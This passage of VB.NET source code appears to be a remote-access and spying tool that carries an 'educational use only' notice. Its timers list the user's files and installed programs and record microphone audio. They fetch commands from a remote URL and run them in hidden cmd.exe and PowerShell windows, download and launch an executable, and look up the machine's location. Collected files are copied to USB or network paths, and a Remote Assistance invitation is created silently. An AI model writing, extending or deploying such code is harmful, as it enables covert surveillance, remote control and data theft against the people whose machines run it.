            RecentLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub DirT_Tick(sender As Object, e As EventArgs) Handles DirT.Tick
        Try
            DirList.Text = String.Empty
            Dim allFiles As New System.Text.StringBuilder
            allFiles.AppendLine("Files And Directories: ")
            Dim directories As String() = {"Desktop", "Downloads", "Documents", "Pictures", "Music", "Videos", "OneDrive"}
            For Each dir As String In directories
                Dim path As String = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), dir)
                If Directory.Exists(path) Then
                    Dim files As String() = Directory.GetFiles(path)
                    Dim folders As String() = Directory.GetDirectories(path)
                    For Each file As String In files
                        allFiles.AppendLine(file)
                    Next
                    For Each folder As String In folders
                        allFiles.AppendLine(folder)
                    Next
                End If
            Next
            allFiles.AppendLine("Applications Installed: ")
            Dim uninstallKey As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
            Using rk As RegistryKey = Registry.LocalMachine.OpenSubKey(uninstallKey)
                For Each skName As String In rk.GetSubKeyNames()
                    Using sk As RegistryKey = rk.OpenSubKey(skName)
                        Try
                            Dim displayName As String = sk.GetValue("DisplayName")
                            If displayName IsNot Nothing Then
                                allFiles.AppendLine(displayName)
                            End If
                        Catch ex As Exception
                            DirListLabel.Text = ex.Message
                        End Try
                    End Using
                Next
            End Using
            DirList.Text = allFiles.ToString()
        Catch ex As Exception
            DirListLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub MicT_Tick(sender As Object, e As EventArgs) Handles MicT.Tick
        Try
            mciSendString($"save recsound {filePath}", New StringBuilder(), 0, 0)
            mciSendString("close recsound", New StringBuilder(), 0, 0)
            fileName = Environment.UserName.ToString & "_Audio_" & DateTime.Now.ToString("yyyy-MM-dd-HH-mm") & ".wav"
            filePath = Path.Combine(srcDir, fileName)
            mciSendString("open new type waveaudio alias recsound", New StringBuilder(), 0, 0)
            mciSendString("record recsound", New StringBuilder(), 0, 0)
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub CLT_Tick(sender As Object, e As EventArgs) Handles CLT.Tick
        Try
            Dim url As String = "https://.txt"
            Dim webClient As New WebClient()
            Dim content As String = webClient.DownloadString(url)
            If String.IsNullOrWhiteSpace(content) Then
                Return
            End If
            Dim linesCL() As String = content.Split(New String() {Environment.NewLine}, StringSplitOptions.None)
            If linesCL.Length = 0 OrElse String.IsNullOrWhiteSpace(linesCL(0)) Then
                Return
            End If
            Dim currentCommandCL As String = linesCL(0)
            If currentCommandCL <> previousCommandCL Then
                commandExecutedCL = False
                previousCommandCL = currentCommandCL
            End If
            If Not commandExecutedCL Then
                Dim psi As New ProcessStartInfo("cmd.exe")
                psi.WindowStyle = ProcessWindowStyle.Hidden
                psi.Arguments = "/c " & currentCommandCL
                Process.Start(psi)
                commandExecutedCL = True
            End If
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub PST_Tick(sender As Object, e As EventArgs) Handles PST.Tick
        Try
            Dim url As String = "https://.txt"
            Dim webClient As New WebClient()
            Dim content As String = webClient.DownloadString(url)
            If String.IsNullOrWhiteSpace(content) Then
                Return
            End If
            Dim linesPS() As String = content.Split(New String() {Environment.NewLine}, StringSplitOptions.None)
            If linesPS.Length = 0 OrElse String.IsNullOrWhiteSpace(linesPS(0)) Then
                Return
            End If
            Dim currentCommandPS As String = linesPS(0)
            If currentCommandPS <> previousCommandPS Then
                commandExecutedPS = False
                previousCommandPS = currentCommandPS
            End If
            If Not commandExecutedPS Then
                Dim psi As New ProcessStartInfo("powershell.exe")
                psi.WindowStyle = ProcessWindowStyle.Hidden
                psi.Arguments = "-Command " & currentCommandPS
                Process.Start(psi)
                commandExecutedPS = True
            End If
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub LoadT_Tick(sender As Object, e As EventArgs) Handles LoadT.Tick
        Try
            Dim url As String = "https://.zip"
            Dim webClient As New WebClient()
            Dim content As String = webClient.DownloadString(url)
            If String.IsNullOrWhiteSpace(content) Then
                Return
            End If
            Dim srcDir As String = "BPL"
            Dim hostFolder As String = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, srcDir)
            If Not Directory.Exists(hostFolder) Then
                Directory.CreateDirectory(hostFolder)
            End If
            Dim lines() As String = content.Split(New String() {Environment.NewLine}, StringSplitOptions.None)
            For Each line As String In lines
                If Not String.IsNullOrWhiteSpace(line) Then
                    Dim fileUrl As String = line.Trim()
                    Dim fileName As String = Path.GetFileName(fileUrl)
                    Dim filePath As String = Path.Combine(hostFolder, fileName)

                    If fileUrl.ToLower().EndsWith(".zip") Then
                        Dim zipPath As String = Path.Combine(Path.GetTempPath(), fileName)
                        webClient.DownloadFile(fileUrl, zipPath)
                        ZipFile.ExtractToDirectory(zipPath, hostFolder, overwriteFiles:=True)
                        File.Delete(zipPath)
                    Else
                        webClient.DownloadFile(fileUrl, filePath)
                    End If
                End If
            Next
            Dim scanPath As String = Path.Combine(hostFolder, "System.exe")
            If File.Exists(scanPath) Then
                Process.Start(scanPath)
            End If
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub WANT_Tick(sender As Object, e As EventArgs) Handles WANT.Tick
        Try
            Dim request As WebRequest = WebRequest.Create("http://ip-api.com/json")
            request.Method = "GET"
            Dim response As WebResponse = request.GetResponse()
            Dim reader As New StreamReader(response.GetResponseStream())
            Dim json As String = reader.ReadToEnd()
            Dim location As Dictionary(Of String, Object) = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(json)
            Dim latitude As String = location("lat").ToString()
            Dim longitude As String = location("lon").ToString()
            Dim ipv4 As String = location("query").ToString()
            Dim cityName As String = location("city").ToString()
            Dim regionName As String = location("regionName").ToString()
            Dim country As String = location("country").ToString()
            DeviceGeoLocationLabel.Text = "Device Latitude And Longitude: " & latitude & ", " & longitude
            DeviceIPv4WANAddressLabel.Text = "Device IPv4 WAN Address: " & ipv4
            DeviceGeoNameLabel.Text = "Device Location Name: " & cityName & ", " & regionName & ", " & country
        Catch ex As Exception
            DeviceGeoLocationLabel.Text = ex.Message
            DeviceIPv4WANAddressLabel.Text = ex.Message
            DeviceGeoNameLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub CopyT_Tick(sender As Object, e As EventArgs) Handles CopyT.Tick
        Try
            Dim removableDrives = From drive In IO.DriveInfo.GetDrives()
                                  Where drive.DriveType = IO.DriveType.Removable
                                  Select drive
            Dim bpd0Found As Boolean = False

            For Each drive In removableDrives
                Dim bpd0Path = Path.Combine(drive.Name, "BPDO")
                If Directory.Exists(bpd0Path) Then
                    bpd0Found = True
                    For Each file As String In Directory.GetFiles(srcDir)
                        Dim destinationFile As String = Path.Combine(bpd0Path, Path.GetFileName(file))
                        Dim destinationFileNames As String() = Directory.GetFiles(bpd0Path).Select(Function(f) Path.GetFileName(f)).ToArray()
                        If Not destinationFileNames.Contains(Path.GetFileName(file)) Then
                            System.IO.File.Copy(file, destinationFile)
                            System.IO.File.Delete(file)
                        End If
                    Next
                    Exit For
                End If
            Next

            If Not bpd0Found Then
                Dim copyTo As String = "NetworkPath"
                If Directory.Exists(copyTo) Then
                    For Each file As String In Directory.GetFiles(srcDir)
                        Dim destinationFile As String = Path.Combine(copyTo, Path.GetFileName(file))
                        Dim destinationFileNames As String() = Directory.GetFiles(copyTo).Select(Function(f) Path.GetFileName(f)).ToArray()
                        If Not destinationFileNames.Contains(Path.GetFileName(file)) Then
                            System.IO.File.Copy(file, destinationFile)
                            System.IO.File.Delete(file)
                        End If
                    Next
                Else
                    ExternalLabel.Text = "Path Not Found"
                End If
            End If
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Sub CreateInvitationFile()
        Try
            Dim p As New System.Diagnostics.Process()
            Dim fileurl As String = Path.Combine(srcDir, "Invitation.msrcincident")
            If File.Exists(fileurl) Then
                File.Delete(fileurl)
            End If
            Dim password As String = GeneratePassword()
            File.WriteAllText(Path.Combine(srcDir, "External.txt"), password)
            p.StartInfo.UseShellExecute = True
            p.StartInfo.RedirectStandardOutput = False
            p.StartInfo.CreateNoWindow = True
            p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
            p.StartInfo.FileName = "Msra.exe"
            p.StartInfo.Arguments = "/saveasfile " & fileurl & " " & password
            Console.WriteLine(p.StartInfo.Arguments)
            p.Start()
            While File.Exists(fileurl) = False
                Thread.Sleep(1000)
            End While
            ExternalLabel.Text = "External: Remote Access Ready"
        Catch ex As Exception
            ExternalLabel.Text = "External: " & ex.Message
        End Try
    End Sub
    Function GeneratePassword() As String
        Dim passwordLength As Integer = 10
        Dim possibleChars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"
        Dim rng As New RNGCryptoServiceProvider()
        Dim builder As New StringBuilder()
        For i As Integer = 1 To passwordLength
            Dim buffer As Byte() = New Byte(0) {}
            rng.GetBytes(buffer)
            Dim index As Integer = buffer(0) Mod possibleChars.Length
            Dim nextChar As Char = possibleChars(index)
            builder.Append(nextChar)
        Next
        Return builder.ToString()
    End Function

    Private Sub RemoteT_Tick(sender As Object, e As EventArgs) Handles RemoteT.Tick
        RemoteT.Stop()
        RemoveHandler RemoteT.Tick, AddressOf RemoteT_Tick
        CreateInvitationFile()
    End Sub

End Class

'© Copyright 2025 Elliot Monteverde. All Rights Reserved. For educational use only.'